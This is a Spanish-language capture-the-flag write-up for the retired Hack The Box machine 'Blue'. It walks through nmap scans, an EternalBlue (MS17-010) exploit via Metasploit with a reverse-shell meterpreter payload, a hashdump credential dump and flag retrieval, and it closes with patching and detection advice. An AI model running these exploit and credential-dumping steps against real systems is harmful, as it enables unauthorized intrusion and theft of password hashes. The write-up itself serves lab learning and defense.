---
machine: Blue
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, ms17-010, eternalblue, smb, metasploit]
---

# Blue — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Un Windows 7 sin parchear con SMBv1 expuesto. **MS17-010 (EternalBlue)** da ejecución como `NT AUTHORITY\SYSTEM` en un solo paso; después `hashdump` saca los hashes locales y las dos flags están en los escritorios de `haris` y `Administrator`. La gracia del box es que no hay escalada: el fallo es de kernel y ejecuta en contexto de SYSTEM.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
135/tcp   msrpc        Microsoft Windows RPC
139/tcp   netbios-ssn
445/tcp   microsoft-ds Windows 7 Professional 7601 Service Pack 1
3389/tcp  tcpwrapped
```

```bash
nmap -p445 --script smb-vuln-ms17-010 <IP>
```

```text
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

También se ve con `smbclient -L` que el hostname es `HARIS-PC`.

## Foothold

Con Metasploit el camino es directo: el módulo `exploit/windows/smb/ms17_010_eternalblue` habla SMBv1, corrompe el pool del kernel y ejecuta el payload en modo kernel, que arranca una shell como SYSTEM.

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <IP>
msf6 > set LHOST <tu IP>
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run

[*] Sending stage (201798 bytes) to <IP>
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Si el exploit falla por el estado del pool, un reinicio del objetivo o unos reintentos suelen bastar; el crash del SMB (`BugCheck`) no persiste.

## Post-explotación

```text
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash>::
Guest:501:...
haris:1000:aad3b435b51404eeaad3b435b51404ee:<hash>::
```

```text
meterpreter > cat "C:\\Users\\haris\\Desktop\\user.txt"
meterpreter > cat "C:\\Users\\Administrator\\Desktop\\root.txt"
```

Alternativa sin Metasploit: cualquier implementación pública de EternalBlue (`MS17-010` de worawit, `eternalblue-doublepulsar`…) con un shellcode de reverse shell propio, o el script de AutoBlue.

## Evidencia (redactada)

```text
C:\Users\haris\Desktop\user.txt          -> <user_flag>
C:\Users\Administrator\Desktop\root.txt  -> <root_flag>
```

## Lecciones

- SMBv1 y MS17-010 son el ejemplo canónico de vulnerabilidad de kernel explotable en red: un solo paquete compromete el host.
- El vector no requiere credenciales ni interacción; parchear es la única defensa real, porque el puerto 445 está expuesto por diseño.
- Mitigación: deshabilitar SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`), bloquear 445 en el perímetro y aplicar MS17-010. La detección se apoya en eventos de crash del servicio y tráfico SMB anómalo con transacciones `NT Trans` gigantes.
